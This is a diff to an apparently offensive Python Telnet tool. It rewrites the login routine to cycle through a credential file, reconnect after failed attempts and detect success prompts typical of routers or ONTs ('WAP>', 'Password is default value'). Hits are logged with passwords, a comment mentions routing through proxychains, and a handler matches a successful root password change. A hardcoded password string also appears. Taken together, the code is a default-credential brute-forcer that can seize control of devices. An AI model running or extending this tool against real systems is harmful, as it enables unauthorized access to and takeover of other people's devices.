@@ -32,99 +32,127 @@ password = "EGflFhmzQUnTc8gJlku/".encode()
 global_error = False
 
 # Return a socket with the telnet session
+# Return a socket with the telnet session
 def telnet_auth_sequence(log_number, remote_host, remote_port, credentials_path, log_output=None, max_retries=5, detail=True):
-
     global global_error
     global auth_timeout
     global commands_timeout
-    global username, password
 
     # Import credentials distinct to defaults one when specified
+    credentials = []
     if not credentials_path.endswith('default.csv'):
         with open(credentials_path, 'r') as file:
             for line in file:
-                items = line.split(',')
-                
-            username = items[0] + '\r\n'
-            password = items[1].rstrip() + '\r\n'
-            username = username.encode()
-            password = password.encode()
+                items = line.strip().split(',')
+                if len(items) >= 2:
+                    credentials.append((items[0], items[1]))
 
+    if not credentials:
+        print(Colors.RED + "[!] No credentials loaded!" + Colors.R)
+        return
 
     # Record the start time before attempting the remote_socket
     start_time = datetime.now()
 
+    # Try to establish the socket once
     remote_socket = None
-    try:
-        # connect to the remote host
-        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    for i in range(max_retries):
+        try:
+            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            remote_socket.settimeout(auth_timeout)
+            remote_socket.connect((remote_host, remote_port))
+            remote_sockets.append(remote_socket)
+            break  # Successfully connected
+        except Exception as e:
+            if detail:
+                print(Colors.RED + f"[!] Connection attempt {i+1}/{max_retries} failed: {e}" + Colors.R)
+            continue
 
-        for i in range(0, max_retries):
+    if not remote_socket:
+        print(Colors.RED + "[!] Failed to establish connection after retries." + Colors.R)
+        return None
+
+    # Loop through the credentials
+    for username_raw, password_raw in credentials:
+        username = username_raw + '\r\n'
+        password = password_raw + '\r\n'
+        username = username.encode()
+        password = password.encode()
+        
+        print(Colors.GREEN + f"{username}" + Colors.R)
+        print(Colors.GREEN + f"{password}" + Colors.R)
+
+        if remote_socket:
             try:
-                remote_socket.settimeout(auth_timeout)
-                remote_socket.connect((remote_host, remote_port))
+                # First wait for "Login:" or just send username
+                response = socket_send_data(log_number, remote_host, remote_socket, username, auth_timeout, True)
 
-                # Add the remote socket to the list
-                remote_sockets.append(remote_socket)
-            except:
-                continue
+                # If still asking for login, send again
+                if b"Login:" in response:
+                    response = socket_send_data(log_number, remote_host, remote_socket, username, auth_timeout, True)
 
-    except Exception as e:
-        global_error = True
-        if detail:
-            print(Colors.RED + f"[x] Error XYZ:\t\t{e}" + Colors.R)
-        return
+                # Now send the password
+                if b"Password:" in response:
+                    if detail:
+                        print(f"{Colors.ORANGE}[=>] Sending this password now:\t{password}{Colors.R}")
 
-    # Execute login command sequence
-    #login_sequence = [username, password, ENTER]
-    login_sequence = [username, password]
+                    response = socket_send_data(log_number, remote_host, remote_socket, password, auth_timeout, True)
 
-    # Another version for negotiation tries before login sequence
-    #negotiation     = [ENTER, auth_request2]
-    #login_sequence  = negotiation + login_sequence
-    #login_sequence  = login_sequence + negotiation
+                # Check if login success
+                if (b"Last login" in response or
+                    b"Password is default value" in response or
+                    b"The number of sessions exceeds" in response or
+                    b"WAP>" in response):  # Your shell prompt here!
+                    
+                    login_data = [remote_host, datetime.now() - start_time, datetime.now(), True, password_raw]
+                    login_log(login_data, log_number, False)
 
-    if remote_socket:
-        # Receive response
-        response = socket_send_sequence(log_number, remote_host, remote_socket, login_sequence, auth_timeout, True, log_output)
-    else:
-        print(Colors.RED + "[!] Remote socket not created!" + Colors.R)
-        return
+                    if detail:
+                        print(Colors.GREEN + f"[!] Successful Telnet Session to [{remote_host}:{remote_port}] with user {username_raw}" + Colors.R)
+                        print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)
+                    global_error = False
 
-    # Calculate the elapsed time even in case of remote_socket error
-    elapsed_time = datetime.now() - start_time
+                    if detail:
+                        print(Colors.ORANGE + f"[!] Elapsed time: {datetime.now() - start_time}" + Colors.R)
 
-    # Properly cast the variable
-    if type(response) is bytes:
-        response = response.decode('latin')
+                    return remote_socket  # Return connected socket
 
-    #if "Last login" in response:
-    if "Password is default value" in response:
-        login_data = [remote_host, elapsed_time, datetime.now(), True, password]
-        #login_log(login_data, log_number, True)   # Data is logged into a csv file and database
-        login_log(login_data, log_number, False)   # Data is logged into a csv file but not in database (to use proxychains)
+                elif b"User name or password is wrong" in response or b"incorrect" in response:
+                    # Failed attempt, log and try next credential
+                    login_data = [remote_host, datetime.now() - start_time, datetime.now(), False, password_raw]
+                    login_log(login_data, log_number, False)
 
-        if detail:
-            print(Colors.GREEN + f"[!] Successful Telnet Session to [{remote_host}:{remote_port}]" + Colors.R)
-            print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)
-        global_error = False
-    else:
-        login_data = [remote_host, elapsed_time, datetime.now(), False, password]
-        #login_log(login_data, log_number)   # Data is logged into a csv file and database
-        login_log(login_data, log_number, False)   # Data is logged into a csv file but not in database (to use proxychains)
+                    if detail:
+                        print(Colors.RED + f"[x] Failed login with {username_raw}:{password_raw}" + Colors.R)
 
-        if detail:
-            print(Colors.RED + f"[x] Failed Telnet Session to [{remote_host}:{remote_port}]\n" + Colors.R)
-        global_error = True
-        return remote_socket
+                    # Now important:
+                    # Check if server dropped connection
+                    if remote_socket.fileno() == -1:
+                        print(Colors.RED + "[!] Server closed connection after bad login, reconnecting..." + Colors.R)
+                        # Try to reconnect
+                        remote_socket.close()
+                        for i in range(max_retries):
+                            try:
+                                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                remote_socket.settimeout(auth_timeout)
+                                remote_socket.connect((remote_host, remote_port))
+                                remote_sockets.append(remote_socket)
+                                break  # Successfully reconnected
+                            except:
+                                continue
 
+            except Exception as e:
+                if detail:
+                    print(Colors.RED + f"[!] Exception during login attempt: {e}" + Colors.R)
+                global_error = True
+                return None
 
-    if detail:
-        print(Colors.ORANGE + f"[!] Elapsed time: {elapsed_time}" + Colors.R)
-
-    # Final return
-    return remote_socket
-
+    print(Colors.RED + "[!] No valid credentials found after trying all combinations." + Colors.R)
+    try:
+        remote_socket.close()
+    except:
+        pass
+    return None
 
 
 # This methods doesn't include a timeout, it waits for all the data to be received
@@ -196,7 +224,7 @@ def socket_send_data(log_number, remote_ip, remote_socket, command, timeout=5, d
         },
         "EGflFhmzQUnTc8gJlku/": {
             "expected_pattern": b"Password of root has been modified successfully",
-            "handler": lambda response: update_telnet_pass(response, remote_ip, log_number)
+            "handler": lambda response: update_telnet_pass(response, remote_ip, log_number, False)
         },
     }
 
@@ -209,7 +237,8 @@ def socket_send_data(log_number, remote_ip, remote_socket, command, timeout=5, d
     response = b''
     start_time = time.time()
 
-    while True:
+    #while True:
+    while response == b'':
         chunk = socket_receive_all(remote_socket, timeout=timeout)
         response += chunk
 
@@ -227,8 +256,66 @@ def socket_send_data(log_number, remote_ip, remote_socket, command, timeout=5, d
             break
 
     # Log the response
-    print(response)
+    print(f"FLAG:\t{response}")
     return response
+
+# This method works for authenticating only
+def socket_send_auth(log_number, remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
+    global global_error
+
+    response = b''
+
+    if not remote_socket:
+        return response
+
+    cont = 1
+    expected_patterns = [b"Login:", b"Password:", b"WAP>"]  # expected prompts after each command
+    num_commands = len(commands)
+
+    for idx, command in enumerate(commands):
+        #if detail and not global_error:
+        if detail:
+            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{Colors.GREEN}{remote_host}{Colors.BOLD_WHITE}]: {command.strip()}" + Colors.R)
+
+        # First, wait for the expected pattern BEFORE sending the command
+        if idx < len(expected_patterns):
+            expected = expected_patterns[idx]
+            try:
+                remote_socket.settimeout(timeout)
+                buffer = b''
+                start_time = time.time()
+                while True:
+                    try:
+                        chunk = remote_socket.recv(4096)
+                        if not chunk:
+                            break
+                        buffer += chunk
+
+                        if expected in buffer:
+                            if detail:
+                                print(Colors.GREEN + f"[*] Detected expected pattern: {expected.decode(errors='ignore')}" + Colors.R)
+                                print(Colors.ORANGE + f"{chunk}" + Colors.R)
+                            break
+
+                        if time.time() - start_time > timeout:
+                            if detail:
+                                print(Colors.RED + "[!] Timeout waiting for expected prompt." + Colors.R)
+                            break
+                    except socket.timeout:
+                        break
+            except Exception as e:
+                if detail:
+                    print(Colors.RED + f"[!] Exception while waiting for prompt: {e}" + Colors.R)
+
+        # Then send the command
+        if not global_error:
+            response += socket_send_data(log_number, remote_host, remote_socket, command, timeout, detail)
+
+        time.sleep(delay)
+        cont += 1
+
+    return response
+
 
 
 # For sending list of commands. It is possible to save the output log
